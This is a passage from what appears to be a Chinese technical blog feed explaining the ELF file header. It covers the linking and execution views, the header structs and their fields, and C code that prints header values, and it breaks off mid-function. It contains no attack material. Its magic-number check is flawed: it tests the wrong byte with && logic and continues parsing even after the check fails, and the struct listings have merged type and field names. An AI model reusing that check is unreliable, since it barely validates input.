</span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">char</span> *typecheck;</span><br><span class="line">    <span class="keyword">if</span>  (argc&lt;<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[x]not find test ELF file !\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fp=fopen((<span class="keyword">char</span>*)argv[<span class="number">1</span>],<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[x]don't open file\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    typecheck=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    fread(typecheck,<span class="number">0x10</span>,<span class="number">1</span>,fp);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(typecheck[<span class="number">1</span>]!=<span class="string">'E'</span>&amp;&amp;typecheck[<span class="number">2</span>]!=<span class="string">'L'</span>&amp;&amp;typecheck[<span class="number">3</span>]!=<span class="string">'L'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[x]don't is ELF file!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    e_ident_read(typecheck);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(typecheck[<span class="number">4</span>]==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x64_header_read(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(typecheck[<span class="number">4</span>]==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x32_header_read(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[x]get some wrong!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ELF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件解析--ELF header 分析</title>
      <link href="/2023/01/07/ELF%E6%96%87%E4%BB%B6%E5%A4%B4%E8%A7%A3%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/01/07/ELF%E6%96%87%E4%BB%B6%E5%A4%B4%E8%A7%A3%E6%9E%90%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><code>ELF</code> 是<code>Executable and Linking Format</code>的缩写，即可执行和可链接的格式，是<code>Unix/Linux</code>系统<code>ABI (Application Binary Interface)</code>规范的一部分。<code>Unix/Linux</code>下的可执行二进制文件、目标代码文件、共享库文件和core dump文件都属于<code>ELF</code>文件。<a id="more"></a></p><h3 id="ELF格式视图"><a href="#ELF格式视图" class="headerlink" title="ELF格式视图"></a>ELF格式视图</h3><p>ELF文件有链接视图和执行视图，两种视图形式：</p><p><strong>链接视图：</strong><br>静态链接器（即编译后参与生成最终ELF过程的链接器，如ld ）会以链接视图解析ELF。编译时生成的 .o（目标文件）以及链接后的 .so （共享库）均可通过链接视图解析，链接视图可以没有段表（如目标文件不会有段表）。<br><strong>执行视图：</strong><br>动态链接器（即加载器，如x86架构 linux下的 /lib/ld-linux.so.2或者安卓系统下的 /system/linker均为动态链接器）会以执行视图解析ELF并动态链接，执行视图可以没有节表。</p><p><img src="v2-85a5b44f20d53e6e992269dccc20ac6b_720w.jpg" alt="img"></p><p>左边是<code>ELF</code>的链接视图，可以理解为是目标代码文件的内容布局。右边是<code>ELF</code>的执行视图，可以理解为可执行文件的内容布局。</p><p>对于两种视图来说，<code>ELF Header</code>是两种说共有的。</p><p>同时，在两个视图的区别上，对于链接视图来说<code>section</code>是主要特征，同时对于<code>Section Header Table</code> 在链接视图中也是必要的，但<code>Program Header Table</code>来说是非必要的。但对于执行视图来说<code>Segment</code>是主要特征，同时对于<code>Program Header Table</code> 在链接视图中也是必要的，但<code>Section Header Table</code>是非必要的。</p><p><strong><code>segments</code>与<code>sections</code>区分与联系</strong></p><p><code>segments</code>与<code>sections</code>区别在于：</p><ul><li>节（section)<ul><li>在汇编中经常提到的<code>.text</code>，<code>.bss</code>，<code>.data</code>这些都属于<code>section</code>层面上的。</li><li><code>.text</code>：保存程序代码。</li><li><code>.data</code>：保存已经初始化的全局变量和局部静态变量</li><li><code>.bss</code>： 保存未初始化的全局变量和局部静态变量</li><li>目标代码文件中的<code>section</code>和<code>section header table</code>中的条目是一一对应的。<code>section</code>的信息用于<strong>链接器</strong>对<strong>代码重定位</strong>。</li></ul></li><li>段（segment)<ul><li>我们平常说的代码段与数据段这些都是是<code>segment</code>层面上的。</li><li>目标代码中的<code>section</code>会被链接器组织到可执行文件的各个<code>segment</code>中。<code>.text section</code>的内容会组装到代码段中，<code>.data</code>, <code>.bss</code>等节的内容会包含在数据段中。</li><li>而文件载入内存执行时，是以<code>segment</code>组织的，每个<code>segment</code>对应<code>ELF</code>文件中<code>program header table</code>中的一个条目，用来建立可执行文件的进程映像。</li></ul></li></ul><p>段（<code>segments</code>）与节（<code>sections</code>）同时又是是包含的关系，一个<code>segment</code>包含若干个<code>section</code>。当<code>ELF</code>文件被操作系统加载到内存中后（加载到内存中也就是说这个<code>elf</code>要运行），系统会将多个具有相同权限（<code>flg</code>值）<code>section</code>合并成一个<code>segment</code>（优化空间利用），减少内存碎片。</p><h3 id="ELF-Header-分析"><a href="#ELF-Header-分析" class="headerlink" title="ELF Header 分析"></a>ELF Header 分析</h3><p>之前说，在ELF文件中无论说基于执行视图还是链接视图，<code>ELF Header</code>是都有的结构。在elf文件中</p><p><code>ELF header</code>的定义可以在Linux系统的 <code>/usr/include</code>目录下<code>elf.h</code> 文件中找到。(用vs 装上c/c++相关插件后，可以直接定位到)</p><p>在32位与64位系统下，<code>ELF header</code>的定义是不同的：</p><p><code>Elf32_Ehdr</code>是32位 ELF header的结构体。定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>e_ident[EI_NIDENT];<span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Halfe_type;<span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Halfe_machine;<span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Worde_version;<span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addre_entry;<span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Offe_phoff;<span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Offe_shoff;<span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Worde_flags;<span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Halfe_ehsize;<span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Halfe_phentsize;<span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Halfe_phnum;<span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Halfe_shentsize;<span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Halfe_shnum;<span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Halfe_shstrndx;<span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p><code>Elf64_Ehdr</code>是64位ELF header的结构体。定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>e_ident[EI_NIDENT];<span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf64_Halfe_type;<span class="comment">/* Object file type */</span></span><br><span class="line">  Elf64_Halfe_machine;<span class="comment">/* Architecture */</span></span><br><span class="line">  Elf64_Worde_version;<span class="comment">/* Object file version */</span></span><br><span class="line">  Elf64_Addre_entry;<span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf64_Offe_phoff;<span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf64_Offe_shoff;<span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf64_Worde_flags;<span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf64_Halfe_ehsize;<span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf64_Halfe_phentsize;<span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf64_Halfe_phnum;<span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf64_Halfe_shentsize;<span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf64_Halfe_shnum;<span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf64_Halfe_shstrndx;<span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure><p><code>Elf64_Addr</code> 和 <code>Elf64_Off</code> 都是64位无符号整数。而<code>Elf32_Addr</code> 和 <code>Elf32_Off</code>是32位无符号整数。这导致ELF header的所占的字节数不同。32位的ELF header占52个字节，64位的ELF header占64个字节。</p><p><img src="bVbivLE.png" alt="ELF header字节布局"></p><h4 id="e-ident"><a href="#e-ident" class="headerlink" title="e_ident"></a>e_ident</h4><p><code>e_ident</code>占16个字节。前四个字节被称作ELF的Magic Number。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>e_ident[EI_NIDENT];<span class="comment">/* Magic number and other info */</span></span><br></pre></td></tr></table></figure><p><img src="bVbivL1.png" alt="e_ident各字节含义"></p><p>如上图，前4个字节是ELF的<code>Magic Number</code>，固定为<code>7f 45 4c 46</code>，也对应着字符串<code>\177ELF</code><br>第5个字节为<code>EI_CLASS</code>代表当前ELF文件是32位还是64位的。值为 ELFCLASS32（0x1）表32位，数值为 ELFCLASS64 （0x2）表64位。<br>第6个字节为<code>EI_DATA</code>了数据的编码方式，即我们通常说的little endian或是big endian。值 <code>ELFDATA2LSB</code> 表little endian，即为 小端排序，低位字节在前，或者直接说低位字节在低位地址，比如<code>0x7f454c46</code>，存储顺序就是<code>46 4c 45 7f</code> 。 值 <code>ELFDATA2MSB</code>表big endian就是大端排序，高位字节在前，直接说就是高位字节在低位地址，比如<code>0x7f454c46</code>，在文件中的存储顺序是<code>7f 45 4c 46</code>。</p><p>第7个字节为<code>EI_VERSION</code>指明了ELF header的版本号，目前值都是EV_CURRENT（1）。</p><p>第8个字节为<code>EI_OSABI</code>表操作系统<code>ABI</code>标识，现在默认为0，</p><p>第9-16个字节，都填充为0。</p><h4 id="e-type"><a href="#e-type" class="headerlink" title="e_type"></a>e_type</h4><p><code>e_type</code> 代表文件类。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Halfe_type;<span class="comment">/* Object file type */</span></span><br><span class="line">Elf64_Halfe_type;<span class="comment">/* Object file type */</span></span><br></pre></td></tr></table></figure><p>当其值为<code>ET_REL</code>（1）表可重定位文 件（如目标文件）</p><p>当其值为<code>ET_EXEC</code>（2）表可执行文件（可直接执行的文件）</p><p>当其值为<code>ET_DYN</code>（3）表共享目标文件（如SO库）</p><p>当其值为<code>ET_CORE</code>（4）表Core文件（吐核文件）</p><h4 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h4><p><code>e_machine</code>为架构信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Halfe_machine;<span class="comment">/* Architecture */</span></span><br><span class="line">Elf64_Halfe_machine;<span class="comment">/* Architecture */</span></span><br></pre></td></tr></table></figure><p>当值为<code>EM_X86_64</code>(62)表x86-64架构，</p><h4 id="e-verison"><a href="#e-verison" class="headerlink" title="e_verison"></a>e_verison</h4><p>   <code>e_version</code>为文件版本，目前常见的ELF 文件版本均为<code>EV_CURRENT（1）</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Worde_version;<span class="comment">/* Object file version */</span></span><br><span class="line">Elf64_Worde_version;<span class="comment">/* Object file version */</span></span><br></pre></td></tr></table></figure><h4 id="e-entry"><a href="#e-entry" class="headerlink" title="e_entry"></a>e_entry</h4><p><code>e_entry</code>表入口虚拟地址（RVA）。即<code>_start</code>函数所在的地方（地址）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Addre_entry;<span class="comment">/* Entry point virtual address */</span></span><br><span class="line">Elf64_Addre_entry;<span class="comment">/* Entry point virtual address */</span></span><br></pre></td></tr></table></figure><h4 id="e-phoff"><a href="#e-phoff" class="headerlink" title="e_phoff"></a>e_phoff</h4><p><code>e_phoff</code>为程序头表（段表）的偏移，程序头表离启始位置的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Offe_phoff;     <span class="comment">/* Program header table file offset */</span></span><br><span class="line">Elf64_Offe_phoff;     <span class="comment">/* Program header table file offset */</span></span><br></pre></td></tr></table></figure><h4 id="e-shoff"><a href="#e-shoff" class="headerlink" title="e_shoff"></a>e_shoff</h4><p><code>e_shoff</code>为节头表的偏移，节头表离启始位置的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Offe_shoff;<span class="comment">/* Section header table file offset */</span></span><br><span class="line">Elf64_Offe_shoff;<span class="comment">/* Section header table file offset */</span></span><br></pre></td></tr></table></figure><h4 id="e-flags"><a href="#e-flags" class="headerlink" title="e_flags"></a>e_flags</h4><p>处理器特定的标志，一般为<code>0</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Worde_flags;<span class="comment">/* Processor-specific flags */</span></span><br><span class="line">Elf64_Worde_flags;<span class="comment">/* Processor-specific flags */</span></span><br></pre></td></tr></table></figure><h4 id="e-ehsize"><a href="#e-ehsize" class="headerlink" title="e_ehsize"></a>e_ehsize</h4><p><code>Elf_Header</code>的大小（字节），<code>64</code>位则为<code>64</code>，如果是<code>32</code>位则为<code>52</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Halfe_ehsize;<span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">Elf64_Halfe_ehsize;<span class="comment">/* ELF header size in bytes */</span></span><br></pre></td></tr></table></figure><h4 id="e-phentsize"><a href="#e-phentsize" class="headerlink" title="e_phentsize"></a>e_phentsize</h4><p>·<code>e_phentsize</code>表程序头表/段表<code>（Program Header）</code>的大小（字节）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Halfe_phentsize;<span class="comment">/* Program header table entry size */</span></span><br><span class="line">Elf64_Halfe_phentsize;<span class="comment">/* Program header table entry size */</span></span><br></pre></td></tr></table></figure><h4 id="e-phnum"><a href="#e-phnum" class="headerlink" title="e_phnum"></a>e_phnum</h4><p><code>e_phnum</code>表段的数量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Halfe_phnum;<span class="comment">/* Program header table entry count */</span></span><br><span class="line">Elf64_Halfe_phnum;<span class="comment">/* Program header table entry count */</span></span><br></pre></td></tr></table></figure><h4 id="e-shentsize"><a href="#e-shentsize" class="headerlink" title="e_shentsize"></a>e_shentsize</h4><p><code>e_shentsize</code>表节头<code>（Section Header）</code>的大小（字节）。当<code>ELF</code>文件被操作系统加载到内存中后（加载到内存中也就是说这个<code>elf</code>要运行），系统会将多个具有相同权限（<code>flg</code>值）<code>section</code>合并成一个<code>segment</code>（优化空间利用），在这个过程中<code>section</code>的数量可能会发生改变。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Halfe_shentsize;<span class="comment">/* Section header table entry size */</span></span><br><span class="line">Elf64_Halfe_shentsize;<span class="comment">/* Section header table entry size */</span></span><br></pre></td></tr></table></figure><h4 id="e-shnum"><a href="#e-shnum" class="headerlink" title="e_shnum"></a>e_shnum</h4><p><code>e_shnum</code>表节头数量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Halfe_shnum;<span class="comment">/* Section header table entry count */</span></span><br><span class="line">Elf64_Halfe_shnum;<span class="comment">/* Section header table entry count */</span></span><br></pre></td></tr></table></figure><h4 id="e-shstrndx"><a href="#e-shstrndx" class="headerlink" title="e_shstrndx"></a>e_shstrndx</h4><p><code>e_shstrndx</code>表节字符串表的节索引。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Halfe_shstrndx;<span class="comment">/* Section header string table index */</span></span><br><span class="line">Elf64_Halfe_shstrndx;<span class="comment">/* Section header string table index */</span></span><br></pre></td></tr></table></figure><h3 id="代码解析Elf头"><a href="#代码解析Elf头" class="headerlink" title="代码解析Elf头"></a>代码解析Elf头</h3><p>结合上面知识，我们可以用c语言，来解析Elf 头解析。效果如下：</p><p><img src="image-20230107155708294.png" alt="image-20230107155708294"></p><p>原代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">e_ident_read</span><span class="params">(<span class="keyword">char</span> *e_ident)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"头标志:"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">"%x "</span>,e_ident[i]);&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[*]Magic Number:%4s\n"</span>,e_ident);</span><br><span class="line">    <span class="keyword">if</span>(e_ident[<span class="number">4</span>]==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]EI_CLASS: x64 (%d)\n"</span>,e_ident[<span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]EI_CLASS: x86 (%d)\n"</span>,e_ident[<span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(e_ident[<span class="number">5</span>]==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]EI_DATA: big endian (%d)\n"</span>,e_ident[<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]EI_DATA: little endian (%d)\n"</span>,e_ident[<span class="number">5</span>]);</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]EI_VERSION: %d\n"</span>,e_ident[<span class="number">6</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]EI_OSABI: %d\n"</span>,e_ident[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">e_type_check</span><span class="params">(<span class="keyword">int</span> e_type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(e_type==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"文件类型: ET_REL\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(e_type==<span class="number">2</span>)</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"文件类型: ET_EXEC\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(e_type==<span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"文件类型: ET_DYN\n"</span>);       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(e_type==<span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"文件类型: ET_CORE\n"</span>);   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"文件类型: %hx\n"</span>,e_type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x64_header_read</span><span class="params">(FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Elf64_Ehdr elf_header;</span><br><span class="line">    rewind(fp);</span><br><span class="line">    fread(&amp;elf_header,<span class="keyword">sizeof</span>(Elf64_Ehdr),<span class="number">1</span>,fp);</span><br><span class="line">    <span class="keyword">if</span>(elf_header.e_machine==<span class="number">62</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"运行平台: EM_X86_64\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"运行平台: %hx\n"</span>,elf_header.e_machine);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"运行版本:%hx\n"</span>,elf_header.e_version);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"入口虚拟RVA: 0x%lx\n"</span>,elf_header.e_entry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"程序头文件偏移: 0x%lx\n"</span>,elf_header.e_phoff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"节头表文件偏移: 0x%lx\n"</span>,elf_header.e_shoff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF文件头大小: 0x%x\n"</span>,elf_header.e_ehsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF程序头大小: 0x%x\n"</span>,elf_header.e_phentsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF程序头表计数: 0x%x\n"</span>,elf_header.e_phnum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF节头表大小: 0x%x\n"</span>,elf_header.e_shentsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF节头表计数: 0x%x\n"</span>,elf_header.e_shnum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"字符串表索引节头: 0x%x\n"</span>,elf_header.e_shstrndx);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x32_header_read</span><span class="params">(FILE *fp)</span></span></span><br><span 